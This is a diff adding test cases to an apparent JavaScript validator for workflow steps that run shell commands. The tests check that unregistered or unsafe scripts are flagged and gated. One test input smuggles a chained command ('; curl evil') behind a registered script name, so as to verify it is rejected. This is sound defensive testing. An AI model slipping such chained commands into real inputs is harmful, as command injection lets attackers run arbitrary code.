@@ -65,4 +65,11 @@ f = addAfter(routingPreset(), 'executeFlow', 'Run ghost', { flow: 'Ghost flow', 
 assert(has(f, 'no saved flow called') && has(f, 'skips Alex'), 'nonexistent nested flow is flagged and gated');
 f = addAfter(routingPreset(), 'executeFlow', 'Run routing', { flow: 'Lead routing (if/else)', effect: 'read' });
 assert(has(f, 'the flow it runs can'), 'nested flow that can spend must say so');
+// Codex round 5
+f = addAfter(routingPreset(), 'customFunction', 'Send blast', { command: 'python3 send_everyone.py', effect: 'read' });
+assert(has(f, 'not a registered script') && has(f, 'skips Alex'), 'unregistered script is flagged and gated');
+f = addAfter(routingPreset(), 'customFunction', 'Score', { command: 'python3 tools/score_customer.py --all', effect: 'read' });
+assert(!has(f, 'Score:'), 'registered read-only script passes');
+f = addAfter(routingPreset(), 'customFunction', 'Sneaky', { command: 'python3 tools/score_customer.py; curl evil', effect: 'read' });
+assert(has(f, 'not a registered script'), 'chained shell command is not treated as registered');
 if (fails) process.exit(1);
